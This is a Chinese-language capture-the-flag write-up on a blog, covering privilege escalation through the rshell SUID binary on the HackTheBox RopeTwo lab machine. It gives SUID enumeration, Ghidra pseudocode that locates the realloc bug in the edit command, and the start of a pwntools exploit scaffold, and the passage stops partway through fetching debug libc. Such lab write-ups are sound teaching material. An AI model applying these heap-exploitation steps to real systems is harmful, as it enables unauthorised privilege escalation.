<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.0.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fdlucifer.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":null,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox-RopeTwo-[pwn-rshell]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-02-17T19:14:09.000Z">
<meta property="article:modified_time" content="2021-02-17T23:28:31.070Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>HackTheBox-RopeTwo-[pwn-rshell] | lUc1f3r11's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lUc1f3r11's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">39</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">29</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">132</span></a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lucifer11.jpg">
      <meta itemprop="name" content="lUc1f3r11">
      <meta itemprop="description" content="all things about infosec & ctf">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-RopeTwo-[pwn-rshell]
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-02-18 03:14:09 / Modified: 07:28:31" itemprop="dateCreated datePublished" datetime="2021-02-18T03:14:09+08:00">2021-02-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇文章专门记录hack the box - ropetwo机器中获取user权限的pwn rshell部分, Tcache堆利用。</p>
<a id="more"></a>

<h2 id="下载binary文件分析"><a href="#下载binary文件分析" class="headerlink" title="下载binary文件分析"></a>下载binary文件分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/rshell</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">chromeuser@rope2:~$ /usr/bin/rshell</span><br><span class="line">$ id</span><br><span class="line">uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)</span><br><span class="line">$ whoami</span><br><span class="line">r4j</span><br><span class="line">$ ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">rshell: <span class="built_in">pwd</span>: <span class="built_in">command</span> not found</span><br><span class="line">$ ^C</span><br><span class="line">chromeuser@rope2:~$</span><br></pre></td></tr></table></figure>

<p>下载rshell文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/usr/bin$ python3 -m http.server 8001</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...</span><br><span class="line">10.10.14.22 - - [17/Feb/2021 19:33:30] <span class="string">&quot;GET /rshell HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># wget http://10.10.10.196:8001/rshell</span></span><br><span class="line">--2021-02-17 14:30:38--  http://10.10.10.196:8001/rshell</span><br><span class="line">正在连接 10.10.10.196:8001... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：14312 (14K) [application/octet-stream]</span><br><span class="line">正在保存至: “rshell”</span><br><span class="line"></span><br><span class="line">rshell                             100%[===============================================================&gt;]  13.98K  45.0KB/s  用时 0.3s    </span><br><span class="line"></span><br><span class="line">2021-02-17 14:30:39 (45.0 KB/s) - 已保存 “rshell” [14312/14312])</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># ls -la rshell</span></span><br><span class="line">-rw-r--r-- 1 root root 14312  2月 24  2020 rshell</span><br></pre></td></tr></table></figure>

<h2 id="主要循环"><a href="#主要循环" class="headerlink" title="主要循环"></a>主要循环</h2><p>使用<span class="exturl" data-url="aHR0cHM6Ly9naGlkcmEtc3JlLm9yZy8=">Ghidra<i class="fa fa-external-link-alt"></i></span>打开看了看。在搜索字符串“command not found” 时，定位在0x1019be处的函数，将其命名为process_input。调用这个函数的函数是0x101b93，将调用main_loop</p>
<p>使用ghidra重命名函数名和变量名之后的伪代码如下所示，便于阅读:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void main_loop(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ssize_t i;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  byte in_buf [200];</span><br><span class="line">  undefined8 canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  init_stuff();</span><br><span class="line">  memset(in_buf,0,200);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>);</span><br><span class="line">      i = <span class="built_in">read</span>(0,in_buf,199);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((int)i &lt; 2);</span><br><span class="line">    in_buf[(int)i + -1] = 0;</span><br><span class="line">    process_input(in_buf);</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它初始化一些东西，然后进入一个无限循环，打印$，读取最多200个字符，null结束输入，并将其传递给process_input, process_input根据输入中的前几个字符采取行动:</p>
<table>
<thead>
<tr>
<th align="left">输入开始</th>
<th align="left">采取动作</th>
</tr>
</thead>
<tbody><tr>
<td align="left">“ls “</td>
<td align="left">调用 do_ls [0x1015cf]</td>
</tr>
<tr>
<td align="left">“add “</td>
<td align="left">调用 do_add(user_input[4:]) [0x101345]</td>
</tr>
<tr>
<td align="left">“rm “</td>
<td align="left">调用 do_rm(user_input[3:]) [0x10166d]</td>
</tr>
<tr>
<td align="left">“echo “</td>
<td align="left">输出字符串的其余部分</td>
</tr>
<tr>
<td align="left">“edit “</td>
<td align="left">调用 do_edit(user_input[5:]) [0x1017d8]</td>
</tr>
<tr>
<td align="left">“whoami”</td>
<td align="left">打印 “r4j”</td>
</tr>
<tr>
<td align="left">“id”</td>
<td align="left">打印 “uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)”</td>
</tr>
<tr>
<td align="left">其它</td>
<td align="left">打印 “rshell: %s: command not found”</td>
</tr>
</tbody></table>
<h2 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h2><p>该程序一次最多保存两个“文件”，其中file1 on是0x104060的全局文件，file2是0x104130。对于每个文件，前8个字节包含一个指向用户提供的包含文件内容的malloc创建的堆缓冲区的指针。有一种检查只允许大小小于或等于0x70字节。最后一个0xC8(200)字节保存文件的名称。add函数确保第二个文件不能与现有文件同名，并且不能添加超过两个文件。这将是利用该二进制文件的最大限制，因为每次只使用两个文件就很难将堆操作到您想要的位置。</p>
<p>ls命令在两个槽上循环，如果指针非空，它将打印文件的名称。它不打印任何内容，而且无法合法地获取文件的内容，这为开发提供了另一个需要克服的主要障碍。</p>
<p>rm命令在两个槽上循环，查看偏移量为8的字符串，如果字符串与输入匹配，则将字符串文件名全部设置为null，释放包含内容的堆内存，并将指针设置为null。</p>
<p>edit命令是漏洞存在的地方。</p>
<p>使用ghidra将FUN_001017d8函数中各个变量命名成如下形式，便于阅读:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">void do_edit(char *param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int strcmp_res;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  uint read_size;</span><br><span class="line">  int i;</span><br><span class="line">  void *new_buf;</span><br><span class="line">  long canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(long *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  i = 0;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (1 &lt; i) &#123;</span><br><span class="line">      puts(<span class="string">&quot;rshell: No such file or directory&quot;</span>);</span><br><span class="line">LAB_001019a8:</span><br><span class="line">      <span class="keyword">if</span> (canary != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">        __stack_chk_fail();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    strcmp_res = strcmp(param_1,(char *)((long)i * 0xd0 + 0x104068));</span><br><span class="line">    <span class="keyword">if</span> ((strcmp_res == 0) &amp;&amp; ((&amp;item_array)[(long)i * 0x1a] != 0)) &#123;</span><br><span class="line">      read_size = 0;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;<span class="string">&quot;%u&quot;</span>,&amp;read_size);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> (read_size &lt; 0x71) &#123;</span><br><span class="line">        new_buf = realloc((void *)(&amp;item_array)[(long)i * 0x1a],(ulong)read_size);</span><br><span class="line">        <span class="keyword">if</span> (new_buf == (void *)0x0) &#123;</span><br><span class="line">          puts(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          *(void **)(&amp;item_array + (long)i * 0x1a) = new_buf;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">          <span class="built_in">read</span>(0,(void *)(&amp;item_array)[(long)i * 0x1a],(ulong)read_size);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        puts(<span class="string">&quot;Memory Error!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      goto LAB_001019a8;</span><br><span class="line">    &#125;</span><br><span class="line">    i = i + 1;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个循环首先检查i是否大于1，这表示它已经遍历了两个配置，但没有找到要编辑的匹配文件，在这种情况下，它打印一条错误消息并退出。然后，它检查当前项，看看名称是否与输入匹配，如果匹配，它会提示输入一个新的大小(确保小于0x71)，并在现有缓冲区上使用realloc。然后读取并存储内容，并完成。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
<li>利用脚本</li>
</ul>
<p>为了与这个二进制文件交互，使用一些工具。首先，启动一个Python利用脚本。首先，它将只有与rshell中的各种命令交互的方法(这个脚本假设我的ssh公钥在chromeuser的authorized_keys文件中):</p>
<ul>
<li>exp.py</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import pdb</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line">def ls():</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> res.split(b<span class="string">&#x27;\n&#x27;</span>)[:-1]:</span><br><span class="line">        <span class="built_in">print</span>(line.decode())</span><br><span class="line"></span><br><span class="line">def add(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;add &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((<span class="string">&#x27;size: &#x27;</span>, prompt))</span><br><span class="line">    <span class="keyword">if</span> res.endswith(prompt.encode()): </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="built_in">return</span> res </span><br><span class="line">    </span><br><span class="line">def rm(name, <span class="built_in">wait</span>=True):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;rm &#123;name&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">wait</span>:</span><br><span class="line">        p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line">def edit(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;edit &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((<span class="string">&#x27;size: &#x27;</span>, prompt))</span><br><span class="line">    <span class="keyword">if</span> res == prompt: </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line">    p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rshell = ELF(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6-ropetwo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    remote = ssh(host=<span class="string">&#x27;10.10.10.196&#x27;</span>, user=<span class="string">&#x27;chromeuser&#x27;</span>, keyfile=<span class="string">&#x27;/root/keys/ed25519_gen&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote.run(<span class="string">&#x27;rshell&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>

<ul>
<li>Libc</li>
</ul>
<p>使用与RopeTwo相同的libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ ldd /usr/bin/rshell</span><br><span class="line">        linux-vdso.so.1 (0x00007ffd1df75000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbe10a9c000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007fbe10c96000)</span><br></pre></td></tr></table></figure>

<p>使用scp来获取libc.so.6, (在我的主机把它命名为libc.so.6-ropetwo)和ld-linux-x86-64.so.2。</p>
<p>想要libc的debug符号，所以使用与<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIwLzA2LzI3L2h0Yi1wbGF5ZXJ0d28uaHRtbCNmaXgtaGVhcGluZm8=">PlayerTwo<i class="fa fa-external-link-alt"></i></span>相同的过程:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># proxychains wget https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">--2021-02-17 15:53:59--  https://answers.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/2.29-0ubuntu2/+build/16599428/+files/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">正在解析主机 answers.launchpad.net (answers.launchpad.net)... 224.0.0.1</span><br><span class="line">正在连接 answers.launchpad.net (answers.launchpad.net)|224.0.0.1|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  answers.launchpad.net:443  ...  OK</span><br><span 